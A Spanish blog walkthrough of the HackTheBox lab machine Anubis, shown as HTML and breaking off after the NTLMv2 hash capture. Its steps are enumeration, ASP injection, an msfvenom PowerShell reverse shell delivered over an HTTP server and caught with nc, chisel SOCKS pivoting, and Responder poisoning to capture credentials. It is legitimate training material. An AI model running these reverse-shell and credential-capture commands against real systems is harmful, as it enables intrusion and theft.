<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>HackTheBox - Anubis (insane) | MiguelRega7 - blog</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="HackTheBox - Anubis (insane)" />
<meta name="author" content="MiguelRega7" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
<link rel="canonical" href="http://localhost:4000/hackthebox/machines/insane/2024/07/14/anubis.html" />
<meta property="og:url" content="http://localhost:4000/hackthebox/machines/insane/2024/07/14/anubis.html" />
<meta property="og:site_name" content="MiguelRega7 - blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2024-07-14T00:00:00-06:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="HackTheBox - Anubis (insane)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-07-14T00:00:00-06:00","datePublished":"2024-07-14T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Anubis (insane)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/insane/2024/07/14/anubis.html"},"url":"http://localhost:4000/hackthebox/machines/insane/2024/07/14/anubis.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
</head>
<body><header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Anubis (insane)</h1>
    <p class="post-meta"><time class="dt-published" datetime="2024-07-14T00:00:00-06:00" itemprop="datePublished">
        Jul 14, 2024
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/3a460ae7ce41664384f83e3d6e2c7650.png" />
</p>

<ul>
  <li>Anubis is an insane difficulty Windows machine that showcases how a writable certificate template in the Windows Public Key Infrastructure can lead to the escalation of privileges to Domain Administrator in an Active Directory environment. An interactive shell on a Windows container can be obtained by exploiting a simple ASP code injection vulnerability in a public-facing web application. Pivoting from the initial shell, further access is gained to an internal web application that can be tricked into sending requests to an attacker-controlled Responder server, allowing to steal valid domain credentials that can be used to access an internal SMB share where malicious Jamovi files can be uploaded, resulting in a shell on the Windows host. After adding the smart card logon extended usage attribute to an available certificate template and requesting a new client certificate, PKINIT can be configured on an attacking Linux machine to request a Kerberos ticket and login to the system as Administrator.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> ../nmap/targeted
<span class="c"># Nmap 7.94SVN scan initiated Fri Jul 12 17:35:12 2024 as: nmap -sCV -p135,443,445,593,49694 -oN targeted 10.10.11.102</span>
Nmap scan report <span class="k">for </span>10.10.11.102
Host is up <span class="o">(</span>0.11s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2024-07-12T23:45:55+00:00<span class="p">;</span> +8m51s from scanner time.
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.windcorp.htb
| Subject Alternative Name: DNS:www.windcorp.htb
| Not valid before: 2021-05-24T19:44:56
|_Not valid after:  2031-05-24T19:54:56
|_http-title: Not Found
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8m52s, deviation: 2s, median: 8m50s
| smb2-time:
|   <span class="nb">date</span>: 2024-07-12T23:45:23
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
</code></pre></div></div>

<h2 id="enumeración">Enumeración</h2>

<ul>
  <li>No podemos enumerar por el protocolo <code class="language-plaintext highlighter-rouge">RPC</code> de momento.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-N</span> <span class="nt">-U</span> <span class="s2">""</span> 10.10.11.102
rpcclient <span class="nv">$&gt;</span> enumdomusers
result was NT_STATUS_ACCESS_DENIED
</code></pre></div></div>

<ul>
  <li>Vemos el nombre del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ cme smb 10.10.11.102
SMB         10.10.11.102    445    EARTH            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:EARTH<span class="o">)</span> <span class="o">(</span>domain:windcorp.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar los nombres al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"10.10.11.102 DC.windcorp.htb windcorp.htb earth.windcorp.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.102 DC.windcorp.htb windcorp.htb earth.windcorp.htb
</code></pre></div></div>

<ul>
  <li>No vemos nada.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/1.png" />
</p>

<ul>
  <li>Si analizamos el escaneo de <strong>Nmap</strong> vemos un subdominio pero si hacemos <code class="language-plaintext highlighter-rouge">fuzzing</code> vemos que también existe.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2024-07-12T23:45:55+00:00<span class="p">;</span> +8m51s from scanner time.
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>www.windcorp.htb
| Subject Alternative Name: DNS:www.windcorp.htb
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">-H</span> <span class="s2">"Host: FUZZ.windcorp.htb"</span> <span class="nt">-u</span> https://windcorp.htb
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://windcorp.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   200        1007 L   3245 W     46774 Ch    "www"
</span></code></pre></div></div>

<ul>
  <li>Vamos agregarlo al <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat</span> /etc/hosts | <span class="nb">tail</span> <span class="nt">-n</span> 1
10.10.11.102 DC.windcorp.htb windcorp.htb earth.windcorp.htb www.windcorp.htb
</code></pre></div></div>

<ul>
  <li>Ahora si nos carga una pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/2.png" />
</p>

<ul>
  <li>Al no haber nada interesante en la página web vamos a probar con la parte de <code class="language-plaintext highlighter-rouge">contact</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/3.png" />
</p>

<ul>
  <li>Vemos que la extensión es <code class="language-plaintext highlighter-rouge">.asp</code> <a href="https://www.dommia.com/es/faqs/que-es-asp">https://www.dommia.com/es/faqs/que-es-asp</a>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/4.png" />
</p>

<ul>
  <li>Vemos que corre un <code class="language-plaintext highlighter-rouge">IIS</code> <a href="https://blog.infranetworking.com/servidor-iis/">https://blog.infranetworking.com/servidor-iis/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb https://www.windcorp.htb/preview.asp
https://www.windcorp.htb/preview.asp <span class="o">[</span>200 OK] ASP_NET, Bootstrap, Cookies[ASPSESSIONIDSEAQBQCA], Country[RESERVED][ZZ], Email[contact@windcorp.htb,test@test.com], HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.102], Microsoft-IIS[10.0]
</code></pre></div></div>

<ul>
  <li>
    <p>Podemos inyectar código <code class="language-plaintext highlighter-rouge">asp</code> en la parte del <code class="language-plaintext highlighter-rouge">message</code> <a href="https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html">https://www.hackingdream.net/2020/02/reverse-shell-cheat-sheet-for-penetration-testing-oscp.html</a>.</p>
  </li>
  <li>
    <p>Vamos a ejecutar el comando <code class="language-plaintext highlighter-rouge">whoami</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/5.png" />
</p>

<ul>
  <li>
    <p>Vemos que estamos como <code class="language-plaintext highlighter-rouge">nt authority\system</code>.</p>
  </li>
  <li>
    <p>Vamos a ganar acceso a la máquina.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ msfvenom <span class="nt">-p</span> windows/x64/powershell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.74 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> shell.exe
<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1887 bytes
Final size of exe file: 8192 bytes
Saved as: shell.exe
</code></pre></div></div>

<ul>
  <li>Vamos a ejecutar un servidor <code class="language-plaintext highlighter-rouge">http</code> en <code class="language-plaintext highlighter-rouge">python3</code> para compartir el <code class="language-plaintext highlighter-rouge">.exe</code> y descargarlo en la máquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Ahora empleando la misma <code class="language-plaintext highlighter-rouge">query</code> que usamos para ejecutar <code class="language-plaintext highlighter-rouge">whoami</code> vamos a cambiar el comando para descargar el <code class="language-plaintext highlighter-rouge">.exe</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/6.png" />
</p>

<ul>
  <li>Una vez nos llega la petición sabemos que se descargo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
10.10.11.102 - - <span class="o">[</span>14/Jul/2024 12:29:42] <span class="s2">"GET /shell.exe HTTP/1.1"</span> 200 -
</code></pre></div></div>

<ul>
  <li>Ahora vamos a ponernos en escucha para hacer la petición y recibir la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Al darle a <code class="language-plaintext highlighter-rouge">send</code> y a Yes nos llega la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/7.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.74] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.102] 49862
Windows PowerShell running as user WEBSERVER01<span class="nv">$ </span>on WEBSERVER01
Copyright <span class="o">(</span>C<span class="o">)</span> Microsoft Corporation. All rights reserved.


PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; <span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem
PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt;
</code></pre></div></div>

<h2 id="shell-as-localadmin">Shell as localadmin</h2>

<ul>
  <li>Estamos en un contenedor.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; ipconfig

Windows IP Configuration


Ethernet adapter vEthernet <span class="o">(</span>Ethernet<span class="o">)</span>:

   Connection-specific DNS Suffix  <span class="nb">.</span> :
   Link-local IPv6 Address <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : fe80::706d:5871:4a4e:eeae%32
   IPv4 Address. <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 172.31.91.26
   Subnet Mask <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 255.255.240.0
   Default Gateway <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> <span class="nb">.</span> : 172.31.80.1
</code></pre></div></div>

<ul>
  <li>Vemos un certificado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\w</span>indows<span class="se">\s</span>ystem32<span class="se">\i</span>netsrv&gt; <span class="nb">cd  </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">dir


    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop


Mode                LastWriteTime         Length Name
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
<span class="nt">-a----</span>        5/24/2021   9:36 PM            989 req.txt


PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>req.txt
<span class="nt">-----BEGIN</span> CERTIFICATE REQUEST-----
MIICoDCCAYgCAQAwWzELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ETAPBgNVBAoMCFdpbmRDb3JwMSQwIgYDVQQDDBtzb2Z0d2FyZXBvcnRhbC53aW5k
Y29ycC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCmm0r/hZHC
KsK/BD7OFdL2I9vF8oIeahMS9Lb9sTJEFCTHGxCdhRX+xtisRBvAAFEOuPUUBWKb
BEHIH2bhGEfCenhILl/9RRCuAKL0iuj2nQKrHQ1DzDEVuIkZnTakj3A+AhvTPntL
eEgNf5l33cbOcHIFm3C92/cf2IvjHhaJWb+4a/6PgTlcxBMne5OsR+4hc4YIhLnz
QMoVUqy7wI3VZ2tjSh6SiiPU4+Vg/nvx//YNyEas3mjA/DSZiczsqDvCNM24YZOq
qmVIxlmQCAK4Wso7HMwhaKlue3cu3PpFOv+IJ9alsNWt8xdTtVEipCZwWRPFvGFu
1x55Svs41Kd3AgMBAAGgADANBgkqhkiG9w0BAQsFAAOCAQEAa6x1wRGXcDBiTA+H
JzMHljabY5FyyToLUDAJI17zJLxGgVFUeVxdYe0br9L91is7muhQ8S9s2Ky1iy2P
WW5jit7McPZ68NrmbYwlvNWsF7pcZ7LYVG24V57sIdF/MzoR3DpqO5T/Dm9gNyOt
yKQnmhMIo41l1f2cfFfcqMjpXcwaHix7bClxVobWoll5v2+4XwTPaaNFhtby8A1F
F09NDSp8Z8JMyVGRx2FvGrJ39vIrjlMMKFj6M3GAmdvH+IO/D5B6JCEE3amuxU04
CIHwCI5C04T2KaCN4U6112PDIS0tOuZBj8gdYIsgBYsFDeDtp23g4JsR6SosEiso
<span class="nv">4TlwpQ</span><span class="o">==</span>
<span class="nt">-----END</span> CERTIFICATE REQUEST-----
</code></pre></div></div>

<ul>
  <li>Con la herramienta <code class="language-plaintext highlighter-rouge">openssl</code> podemos ver información sobre el certificado y encontramos un subdominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ openssl req <span class="nt">-in</span> req.txt <span class="nt">-text</span> <span class="nt">-noout</span>
Certificate Request:
    Data:
        Version: 1 <span class="o">(</span>0x0<span class="o">)</span>
        Subject: <span class="nv">C</span><span class="o">=</span>AU, <span class="nv">ST</span><span class="o">=</span>Some-State, <span class="nv">O</span><span class="o">=</span>WindCorp, <span class="nv">CN</span><span class="o">=</span>softwareportal.windcorp.htb
</code></pre></div></div>

<ul>
  <li>De primero no podremos ver el contenido por que no estamos en la máquina real entonces vamos agregar el subdominio con la <code class="language-plaintext highlighter-rouge">ip</code> al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para después hacer <code class="language-plaintext highlighter-rouge">pivoting</code> y ver el contenido de la web.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">echo</span> <span class="s2">"172.31.80.1 softwareportal.windcorp.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
172.31.80.1 softwareportal.windcorp.htb
</code></pre></div></div>

<ul>
  <li>Ahora haremos un túnel con <code class="language-plaintext highlighter-rouge">chisel</code> para poder el contenido del subdominio <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./chisel_1.9.1_linux_amd64 server <span class="nt">--reverse</span> <span class="nt">--port</span> 7777
2024/07/14 12:52:12 server: Reverse tunnelling enabled
2024/07/14 12:52:12 server: Fingerprint <span class="nv">hQlhzIeg9gPeaeLFyYcqON7asMg19ni17iUMIiEN7L0</span><span class="o">=</span>
2024/07/14 12:52:12 server: Listening on http://0.0.0.0:7777
</code></pre></div></div>

<ul>
  <li>Ahora corremos el chisel en la máquina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\P</span>rogramData&gt; .<span class="se">\c</span>hisel.exe client 10.10.14.74:7777 R:socks
</code></pre></div></div>

<ul>
  <li>Ahora definimos el proxy para poder ver el contenido.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/8.png" />
</p>

<ul>
  <li>Esta es la web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/9.png" />
</p>

<ul>
  <li>Vemos que hay un apartado donde la empresa ofrece software si ponemos el cursos en alguna de ellos vemos que en la URL pone una IP y el recurso.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/anubis/10.png" />
</p>

<ul>
  <li>
    <p>Lo que podemos hacer es manipular esa petición que se hace para ver a donde viaja.</p>
  </li>
  <li>
    <p>Vamos a ponernos a capturar el trafico para verlo.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>tcpdump <span class="nt">-i</span> tun0 <span class="nt">-w</span> Captura.cap <span class="nt">-v</span>
</code></pre></div></div>

<ul>
  <li>Y ahora cambiamos la IP a la nuestra y enviamos la petición pasando por el tunel.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ proxychains curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s1">'http://softwareportal.windcorp.htb/install.asp?client=10.10.14.74&amp;software=7z1900-x64.exe'</span>
</code></pre></div></div>

<ul>
  <li>Ahora analizamos la captura.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tshark <span class="nt">-r</span> Captura.cap 2&gt;/dev/null
</code></pre></div></div>

<ul>
  <li>Vemos que hay varias conexiones al puerto <code class="language-plaintext highlighter-rouge">5985</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   70   9.313637  10.10.14.74 → 10.10.11.102 TCP 40 5985 → 50335 <span class="o">[</span>RST, ACK] <span class="nv">Seq</span><span class="o">=</span>1 <span class="nv">Ack</span><span class="o">=</span>1 <span class="nv">Win</span><span class="o">=</span>0 <span class="nv">Len</span><span class="o">=</span>0
   71   9.923557 10.10.11.102 → 10.10.14.74  TCP 52 <span class="o">[</span>TCP Port numbers reused] 50335 → 5985 <span class="o">[</span>SYN] <span class="nv">Seq</span><span class="o">=</span>0 <span class="nv">Win</span><span class="o">=</span>64240 <span class="nv">Len</span><span class="o">=</span>0 <span class="nv">MSS</span><span class="o">=</span>1340 <span class="nv">WS</span><span class="o">=</span>256 SACK_PERM
   72   9.923609  10.10.14.74 → 10.10.11.102 TCP 40 5985 → 50335 <span class="o">[</span>RST, ACK] <span class="nv">Seq</span><span class="o">=</span>1 <span class="nv">Ack</span><span class="o">=</span>1 <span class="nv">Win</span><span class="o">=</span>0 <span class="nv">Len</span><span class="o">=</span>0
   73  10.032167 10.10.11.102 → 10.10.14.74  TCP 52 50336 → 5985 <span class="o">[</span>SYN, ECE, CWR] <span class="nv">Seq</span><span class="o">=</span>0 <span class="nv">Win</span><span class="o">=</span>64240 <span class="nv">Len</span><span class="o">=</span>0 <span class="nv">MSS</span><span class="o">=</span>1340 <span class="nv">WS</span><span class="o">=</span>256 SACK_PERM
   74  10.032215  10.10.14.74 → 10.10.11.102 TCP 40 5985 → 50336 <span class="o">[</span>RST, ACK] <span class="nv">Seq</span><span class="o">=</span>1 <span class="nv">Ack</span><span class="o">=</span>1 <span class="nv">Win</span><span class="o">=</span>0 <span class="nv">Len</span><span class="o">=</span>0
   75  10.641543 10.10.11.102 → 10.10.14.74  TCP 52 <span class="o">[</span>TCP Port numbers reused] 50336 → 5985 <span class="o">[</span>SYN] <span class="nv">Seq</span><span class="o">=</span>0 <span class="nv">Win</span><span class="o">=</span>64240 <span class="nv">Len</span><span class="o">=</span>0 <span class="nv">MSS</span><span class="o">=</span>1340 <span class="nv">WS</span><span class="o">=</span>256 SACK_PERM
   76  10.641575  10.10.14.74 → 10.10.11.102 TCP 40 5985 → 50336 <span class="o">[</span>RST, ACK] <span class="nv">Seq</span><span class="o">=</span>1 <span class="nv">Ack</span><span class="o">=</span>1 <span class="nv">Win</span><span class="o">=</span>0 <span class="nv">Len</span><span class="o">=</span>0
   77  11.251435 10.10.11.102 → 10.10.14.74  TCP 52 <span class="o">[</span>TCP Port numbers reused] 50336 → 5985 <span class="o">[</span>SYN] <span class="nv">Seq</span><span class="o">=</span>0 <span class="nv">Win</span><span class="o">=</span>64240 <span class="nv">Len</span><span class="o">=</span>0 <span class="nv">MSS</span><span class="o">=</span>1340 <span class="nv">WS</span><span class="o">=</span>256 SACK_PERM
   78  11.251515  10.10.14.74 → 10.10.11.102 TCP 40 5985 → 50336 <span class="o">[</span>RST, ACK] <span class="nv">Seq</span><span class="o">=</span>1 <span class="nv">Ack</span><span class="o">=</span>1 <span class="nv">Win</span><span class="o">=</span>0 <span class="nv">Len</span><span class="o">=</span>0
</code></pre></div></div>

<ul>
  <li>Ese puerto corresponde al servicio <code class="language-plaintext highlighter-rouge">winrm</code> si se esta comunicando a ese puerto esta viajando alguna autenticación podemos usar responder para al momento de enviar otra petición capturar algún hash <code class="language-plaintext highlighter-rouge">NTLMv2</code> del usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">sudo </span>responder <span class="nt">-I</span> tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  <span class="nt">-__</span>|__ <span class="nt">--</span>|  _  |  _  |     |  _  <span class="o">||</span>  <span class="nt">-__</span>|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0

  To support this project:
  Github -&gt; https://github.com/sponsors/lgandx
  Paypal  -&gt; https://paypal.me/PythonResponder

  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
  To <span class="nb">kill </span>this script hit CTRL-C


<span class="o">[</span>+] Poisoners:
    LLMNR                      <span class="o">[</span>ON]
    NBT-NS                     <span class="o">[</span>ON]
    MDNS                       <span class="o">[</span>ON]
    DNS                        <span class="o">[</span>ON]
    DHCP                       <span class="o">[</span>OFF]

<span class="o">[</span>+] Servers:
    HTTP server                <span class="o">[</span>ON]
    HTTPS server               <span class="o">[</span>ON]
    WPAD proxy                 <span class="o">[</span>OFF]
    Auth proxy                 <span class="o">[</span>OFF]
    SMB server                 <span class="o">[</span>ON]
    Kerberos server            <span class="o">[</span>ON]
    SQL server                 <span class="o">[</span>ON]
    FTP server                 <span class="o">[</span>ON]
    IMAP server                <span class="o">[</span>ON]
    POP3 server                <span class="o">[</span>ON]
    SMTP server                <span class="o">[</span>ON]
    DNS server                 <span class="o">[</span>ON]
    LDAP server                <span class="o">[</span>ON]
    MQTT server                <span class="o">[</span>ON]
    RDP server                 <span class="o">[</span>ON]
    DCE-RPC server             <span class="o">[</span>ON]
    WinRM server               <span class="o">[</span>ON]
    SNMP server                <span class="o">[</span>OFF]

<span class="o">[</span>+] HTTP Options:
    Always serving EXE         <span class="o">[</span>OFF]
    Serving EXE                <span class="o">[</span>OFF]
    Serving HTML               <span class="o">[</span>OFF]
    Upstream Proxy             <span class="o">[</span>OFF]

<span class="o">[</span>+] Poisoning Options:
    Analyze Mode               <span class="o">[</span>OFF]
    Force WPAD auth            <span class="o">[</span>OFF]
    Force Basic Auth           <span class="o">[</span>OFF]
    Force LM downgrade         <span class="o">[</span>OFF]
    Force ESS downgrade        <span class="o">[</span>OFF]

<span class="o">[</span>+] Generic Options:
    Responder NIC              <span class="o">[</span>tun0]
    Responder IP               <span class="o">[</span>10.10.14.74]
    Responder IPv6             <span class="o">[</span>dead:beef:2::1048]
    Challenge <span class="nb">set</span>              <span class="o">[</span>random]
    Don<span class="s1">'t Respond To Names     ['</span>ISATAP<span class="s1">', '</span>ISATAP.LOCAL<span class="s1">']

[+] Current Session Variables:
    Responder Machine Name     [WIN-P9UIMI6NYMM]
    Responder Domain Name      [DB1Q.LOCAL]
    Responder DCE-RPC Port     [45735]

[+] Listening for events...
</span></code></pre></div></div>

<ul>
  <li>Ahora que desplegamos el envenenador vamos a enviar la petición.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ proxychains curl <span class="nt">-s</span> <span class="nt">-X</span> GET <span class="s1">'http://softwareportal.windcorp.htb/install.asp?client=10.10.14.74&amp;software=7z1900-x64.exe'</span>
</code></pre></div></div>

<ul>
  <li>Obtenemos un hash.</li>
</ul>

<blockquote>
